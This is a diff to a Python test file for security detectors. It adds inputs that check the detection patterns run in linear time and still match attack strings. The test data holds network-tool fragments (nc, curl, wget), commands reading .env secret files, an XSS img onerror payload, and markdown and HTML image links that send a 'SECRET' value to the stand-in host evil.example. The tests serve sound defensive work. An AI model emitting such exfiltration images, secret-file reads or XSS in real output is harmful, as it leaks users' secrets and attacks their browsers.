@@ -246,7 +246,8 @@ def test_bad_env_entry_stops_server_startup(monkeypatch):
 # each repeats a keyword many times on one line with nothing that completes
 # the match, so a "keyword, then anything to end of line" pattern rescans the
 # rest of the line from every occurrence ('<' * 100_000 took 35 s).
-@pytest.mark.parametrize("token", ["<", "< ", "<img ", "![", "/", "../", "a/", "nc -", "curl ", "`curl", "wget "])
+@pytest.mark.parametrize("token", ["<", "< ", "<img ", "![", "/", "../", "a/", "nc -", "curl ", "`curl", "wget ",
+                                   "![](http://", "![](http://?", "<img src=http://?", "<img src=http://a/"])
 def test_detectors_run_in_linear_time_on_repetitive_input(token):
     import time
 
@@ -263,6 +264,8 @@ def test_detectors_run_in_linear_time_on_repetitive_input(token):
     "cat ./app/.env",
     "cat .env.production",
     '<div title="x"><img src=x onerror=alert(1)>',
+    "![logo](https://evil.example/p.png?d=SECRET)",
+    '<img alt="" src="https://evil.example/p.png?d=SECRET">',
 ])
 def test_linear_rewrites_still_match(text):
     assert detect({"command": text})
